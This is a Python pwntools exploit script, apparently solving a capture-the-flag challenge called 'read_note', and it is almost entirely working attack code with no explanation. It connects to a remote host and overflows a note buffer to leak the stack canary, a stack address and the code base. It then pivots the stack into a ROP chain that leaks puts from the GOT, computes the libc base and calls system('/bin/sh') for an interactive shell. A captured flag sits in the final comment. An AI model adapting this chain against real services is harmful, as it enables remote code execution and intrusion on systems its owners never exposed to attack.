from pwn import *
#context.log_level = "debug"
local = False
if local:
        p = process("./read_note")
else:
        p = remote("114.116.54.89","10000")

def Rop_gadget(part1,part2,jmp,arg1=0x0,arg2=0x0,arg3=0x0):
	payload = p64(part1)
	payload += p64(0x0)
	payload += p64(0x1)
	payload += p64(jmp)
	payload += p64(arg3)
	payload += p64(arg2)
	payload += p64(arg1)
	payload += p64(part2)
	payload += "A"*56
	return payload

elf = ELF("./read_note")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#gdb.attach(p)
p.recvuntil("note path:")
p.sendline("dev")
p.recvuntil("len:\n")
offset = 0x260 - 0x7
p.sendline(str(offset))
p.recvuntil("note:\n")
payload = "a"*offset
p.send(payload)
p.recvuntil("a"*offset)
canary = u64("\x00" + p.recv(numb=7))
success("canary ==> " + hex(canary))
stack_addr = u64(p.recv(numb=6).ljust(0x8,"\x00"))
success("stack_addr ==> " + hex(stack_addr))
p.recvuntil("(len is 624)\n")
payload = "a"*(0x260-0x8)
payload += p64(canary)
off = 0x7fff25a0b388-0x7fff25a0b350
payload += p64(stack_addr + off)
payload += "\x20"
#gdb.attach(p)
p.send(payload)
p.recvuntil("note path:")
p.sendline("dev")
p.recvuntil("len:\n")
offset = 0x268
p.sendline(str(offset))
p.recvuntil("note:\n")
payload = "a"*0x268
p.send(payload)
p.recvuntil("a"*offset)
Code_addr = u64(p.recv(numb=6).ljust(0x8,"\x00")) - 0xd2e
success("Code_addr ==> " + hex(Code_addr))
elf.address = Code_addr
#0x0000000000000e03 : pop rdi ; ret
#learet : 0xD1E
#puts : 0x202018
#read : 0x202048
#gdb.attach(p)
rop_addr = 0x7ffd0f9a7f20 - 0x7ffd0f9a7ca8
p.recvuntil("(len is 624)\n")
payload = "/bin/sh\x00"
payload += p64(Code_addr + 0xe03)
payload += p64(Code_addr + 0x202018)
payload += p64(elf.symbols['puts'])
payload += Rop_gadget(Code_addr + 0xDFA,Code_addr + 0xDE0,elf.got['read'],0,stack_addr-rop_addr+0x258,0x4000)
payload += ((0x260-0x8 - len(payload))//8) * p64(Code_addr + 0x891)
payload += p64(canary)
payload += p64(stack_addr - rop_addr)
payload += p64(Code_addr + 0xD1E)
#gdb.attach(p)
p.send(payload)
puts_addr = u64(p.recv(numb=6).ljust(0x8,"\x00"))
success("puts_addr ===> " + hex(puts_addr))
libc.address = puts_addr - libc.symbols['puts']
p.recv(numb=1)
payload = p64(Code_addr + 0xe03)
payload += p64(stack_addr - rop_addr + 0x258 + 0x20)
payload += p64(libc.symbols['system'])
payload += "/bin/sh\x00" * 0x10
sleep(0.1)
p.send(payload)
p.interactive()
#0x3cb9fff83d189800
#flag{4278bbab-7780-4d89-8443-612d24aa87c6}
